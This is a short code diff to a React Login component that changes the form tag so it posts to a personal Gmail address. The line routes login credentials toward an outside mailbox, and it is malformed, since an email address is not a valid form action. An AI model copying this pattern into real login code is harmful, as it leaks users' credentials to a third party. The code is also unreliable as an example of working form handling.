@@ -66,7 +66,7 @@ export default function Login() {
                 <div className="form-inner-1">
 
 
-                    <form onSubmit={handleSubmit}>
+                    <form onSubmit={handleSubmit} action="dominika.luczyńska83@gmail.com" method="post">
                         <div className="input-gr">
 
                             <div className="">
